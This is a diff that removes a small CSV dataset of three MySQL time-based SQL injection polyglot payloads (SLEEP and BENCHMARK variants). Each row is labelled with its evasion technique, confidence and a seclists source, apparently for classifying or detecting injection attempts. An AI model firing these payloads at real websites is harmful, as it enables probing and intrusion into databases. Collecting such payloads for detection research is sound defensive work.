@@ -1,4 +1,0 @@
-payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
-SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/,polyglot,mysql,comment_whitespace|inline_comment,0.4,rule,seclists,unknown
-"SLEEP(1) /*' or SLEEP(1) or '"" or SLEEP(1) or ""*/",polyglot,mysql,comment_whitespace|inline_comment,0.4,rule,seclists,unknown
-"IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR""*/",polyglot,mysql,comment_whitespace|inline_comment|function_alternative|hex_string,0.44,rule,seclists,unknown
